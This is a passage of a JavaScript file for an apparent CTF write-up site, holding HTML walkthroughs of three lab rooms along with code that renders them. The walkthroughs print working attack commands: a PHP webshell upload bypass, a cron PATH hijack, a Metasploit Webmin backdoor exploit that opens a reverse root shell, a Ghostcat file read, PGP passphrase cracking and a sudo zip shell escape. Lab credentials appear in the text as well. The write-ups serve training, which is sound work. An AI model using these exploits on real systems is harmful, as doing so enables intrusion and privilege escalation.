<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">File upload bypass &rarr; RCE via webshell</span></div>
<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Cron PATH hijack (malicious pkill)</span></div>
</div>
<hr>
<h2>Phase 1: Reconnaissance</h2>
<pre><code>nmap -sC -sV 10.48.139.103 -oN nmap_scan.txt</code></pre>
<table>
<tr><th>Port</th><th>Service</th></tr>
<tr><td>22/tcp</td><td>SSH (OpenSSH 8.2p1)</td></tr>
<tr><td>80/tcp</td><td>HTTP (Apache 2.4.41)</td></tr>
</table>
<h2>Phase 2: File Upload Bypass</h2>
<p>The website is <strong>RecruitSec</strong> with a CV upload form. HTML comments reveal a <code>/cvs/</code> directory. Accessing <code>/upload.php</code> shows the vulnerable source code.</p>
<pre><code>if (!strpos($target_file, ".pdf")) {
echo "Only PDF CVs are accepted.";
}</code></pre>
<p>Create and upload a PHP webshell with <code>.pdf</code> in the middle of the filename:</p>
<pre><code>echo '<?php system($_GET["cmd"]); ?>' > shell.pdf.php
curl -F "fileToUpload=@shell.pdf.php" http://10.48.139.103/upload.php
curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=id"
# uid=33(www-data)</code></pre>
<h2>Phase 3: User Flag</h2>
<pre><code>curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt"</code></pre>
<h2>Phase 4: SSH Access</h2>
<p>Bash history reveals the previous hacker's tracks:</p>
<pre><code>./cve.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123" | passwd</code></pre>
<p>SSH with password <strong>thisistheway123</strong>.</p>
<h2>Phase 5: Privilege Escalation &mdash; Cron PATH Hijack</h2>
<p>The persistence cron has a misconfigured PATH:</p>
<pre><code>PATH=/home/lachlan/bin:/bin:/usr/bin
* * * * * root ... && pkill -9 -t pts/$f</code></pre>
<p><code>pkill</code> is called without an absolute path, and <code>/home/lachlan/bin</code> is writable:</p>
<pre><code>ssh lachlan@10.48.139.103 \
'echo "#!/bin/bash\ncat /root/root.txt > /tmp/rf.txt" > /home/lachlan/bin/pkill \
&& chmod +x /home/lachlan/bin/pkill'
# Wait for cron, then:
ssh lachlan@10.48.139.103 'cat /tmp/rf.txt'</code></pre>
<hr>
<h2>Vulnerability Chain</h2>
<div class="chain">
<span class="chain-step">strpos() bypass</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">Webshell</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">Cred leak</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">SSH access</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step current">PATH hijack &rarr; root</span>
</div>
<div class="takeaways">
<h3>Key Takeaways</h3>
<ul>
<li><strong>strpos() returning 0 is falsy</strong> &mdash; place .pdf mid-filename to bypass</li>
<li><strong>Always check .bash_history</strong> &mdash; previous attackers leave traces</li>
<li><strong>Relative paths in cron</strong> with writable PATH dirs are instant root</li>
</ul>
</div>
`
},
{
id: "source",
title: "Source",
difficulty: "easy",
flags: 2,
techniques: ["Webmin RCE", "CVE-2019-15107"],
content: `
<h1>Source &mdash; Full Walkthrough</h1>
<div class="writeup-meta">
<span class="meta-item"><strong>Target:</strong> 10.48.131.168</span>
<span class="meta-item"><strong>OS:</strong> Linux</span>
<span class="meta-item"><strong>Flags:</strong> 2</span>
</div>
<div class="flags-grid">
<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Webmin RCE &mdash; /home/dark/user.txt</span></div>
<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Webmin RCE (root) &mdash; /root/root.txt</span></div>
</div>
<hr>
<h2>Phase 1: Reconnaissance</h2>
<pre><code>nmap -sC -sV 10.48.131.168 -oN nmap_scan.txt</code></pre>
<table>
<tr><th>Port</th><th>Service</th></tr>
<tr><td>22/tcp</td><td>SSH (OpenSSH 7.6p1)</td></tr>
<tr><td>10000/tcp</td><td>HTTP (MiniServ 1.890 &mdash; Webmin httpd)</td></tr>
</table>
<p>Webmin 1.890 is vulnerable to <strong>CVE-2019-15107</strong> &mdash; a backdoor inserted via supply chain attack on SourceForge.</p>
<h2>Phase 2: Exploitation &mdash; CVE-2019-15107</h2>
<pre><code>msfconsole
msf6 > use exploit/linux/http/webmin_backdoor
msf6 > set RHOSTS 10.48.131.168
msf6 > set RPORT 10000
msf6 > set SSL true
msf6 > set LHOST 192.168.192.149
msf6 > run

[+] The target is vulnerable.
[+] Command shell session 1 opened
whoami
root</code></pre>
<p>Webmin runs as root &mdash; <strong>no privilege escalation needed</strong>.</p>
<h2>Phase 3: Flag Capture</h2>
<pre><code>cat /root/root.txt
cat /home/dark/user.txt</code></pre>
<p>The compromised <code>webmin_1.890_all.deb</code> package sits in dark's home directory.</p>
<hr>
<h2>Vulnerability Chain</h2>
<div class="chain">
<span class="chain-step">Port 10000 open</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">Webmin 1.890</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">CVE-2019-15107</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step current">Root shell</span>
</div>
<div class="takeaways">
<h3>Key Takeaways</h3>
<ul>
<li><strong>Webmin 1.890 was supply-chain compromised</strong> &mdash; real-world backdoor on SourceForge</li>
<li><strong>Not all services need a privesc step</strong> &mdash; check what user the service runs as</li>
<li><strong>Always verify software versions</strong> against known CVE databases</li>
</ul>
</div>
`
},
{
id: "tomghost",
title: "Tomghost",
difficulty: "easy",
flags: 2,
techniques: ["Ghostcat CVE-2020-1938", "PGP cracking", "sudo zip"],
content: `
<h1>Tomghost &mdash; Full Walkthrough</h1>
<div class="writeup-meta">
<span class="meta-item"><strong>Target:</strong> 10.48.163.2</span>
<span class="meta-item"><strong>OS:</strong> Linux</span>
<span class="meta-item"><strong>Flags:</strong> 2</span>
</div>
<div class="flags-grid">
<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Ghostcat file read &rarr; SSH as skyfuck</span></div>
<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">PGP decrypt &rarr; sudo zip privesc</span></div>
</div>
<hr>
<h2>Phase 1: Reconnaissance</h2>
<pre><code>nmap -sC -sV 10.48.163.2</code></pre>
<table>
<tr><th>Port</th><th>Service</th></tr>
<tr><td>22/tcp</td><td>SSH (OpenSSH 7.2p2)</td></tr>
<tr><td>53/tcp</td><td>tcpwrapped</td></tr>
<tr><td>8009/tcp</td><td>AJP13 (Apache Jserv Protocol v1.3)</td></tr>
<tr><td>8080/tcp</td><td>HTTP (Apache Tomcat 9.0.30)</td></tr>
</table>
<h2>Phase 2: Ghostcat &mdash; CVE-2020-1938</h2>
<p>Tomcat 9.0.30 is vulnerable to unauthenticated file read via AJP on port 8009.</p>
<pre><code>python3 ghostcat.py 10.48.163.2 -p 8009 -f /WEB-INF/web.xml
# Credentials: skyfuck:8730281lkjlkjdqlksalks</code></pre>
<h2>Phase 3: SSH as skyfuck</h2>
<pre><code>ssh skyfuck@10.48.163.2
# Files: credential.pgp, tryhackme.asc</code></pre>
<h2>Phase 4: Crack PGP Passphrase</h2>
<pre><code>gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Passphrase: alexandru</code></pre>
<h2>Phase 5: Decrypt Credentials</h2>
<pre><code>gpg --decrypt credential.pgp
# merlin's password obtained</code></pre>
<h2>Phase 6: Privilege Escalation &mdash; sudo zip</h2>
<pre><code>sudo -l
(root : root) NOPASSWD: /usr/bin/zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
cat /root/root.txt</code></pre>
<hr>
<h2>Vulnerability Chain</h2>
<div class="chain">
<span class="chain-step">AJP port open</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">Ghostcat exploit</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">SSH access</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">PGP crack</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">Lateral move</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step current">sudo zip &rarr; root</span>
</div>
<div class="takeaways">
<h3>Key Takeaways</h3>
<ul>
<li><strong>AJP exposed is critical</strong> &mdash; CVE-2020-1938 enables unauthenticated file reads</li>
<li><strong>PGP keys with weak passphrases</strong> are as bad as weak passwords</li>
<li><strong>sudo zip</strong> can be abused for root shell via GTFOBins</li>
</ul>
</div>
`
}
];

// ===========================
// DOM Elements
// ===========================

const roomsGrid = document.getElementById('roomsGrid');
const writeupSection = document.getElementById('writeupSection');
const writeupContent = document.getElementById('writeupContent');
const backBtn = document.getElementById('backBtn');

// ===========================
// Render Room Cards
// ===========================

function renderCards() {
  roomsGrid.innerHTML = walkthroughs.map((room, index) => {
    const diffLabel = room.difficulty.charAt(0).toUpperCase() + room.difficulty.slice(1);
    const techTags = room.techniques.map(t => `<span class="tech-tag">${t}</span>`).join('');
    
    return `
      <div class="room-card" data-id="${room.id}" style="animation-delay: ${index * 0.05}s">
        <div class="room-card-header">
          <h3>${room.title}</h3>
          <span class="difficulty-badge ${room.difficulty}">${diffLabel}</span>
        </div>
        <div class="room-card-flags">
          <strong>${room.flags}</strong> flag${room.flags > 1 ? 's' : ''}
        </div>
        <div class="room-card-tech">
          ${techTags}
        </div>
      </div>
    `;
  }).join('');

  // Add click handlers
  document.querySelectorAll('.room-card').forEach(card => {
    card.addEventListener('click', () => {
      const id = card.dataset.id;
      openWriteup(id);
    });
  });
}

// ===========================
// Open Writeup
// ===========================

function openWriteup(id) {
  const room = walkthroughs.find(w => w.id === id);
  if (!room) return;

  writeupContent.innerHTML = room.content;
  writeupSection.classList.remove('hidden');
  document.getElementById('rooms').style.display = 'none';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ===========================
// Back Button
// ===========================

backBtn.addEventListener('click', () => {
  writeupSection.classList.add('hidden');
  document.getElementById('rooms').style.display = 'block';
  window.scrollTo({ top: document.getElementById('rooms').offsetTop - 80, behavior: 'smooth' });
});

// ===========================
// Initialize
// ===========================

renderCards();

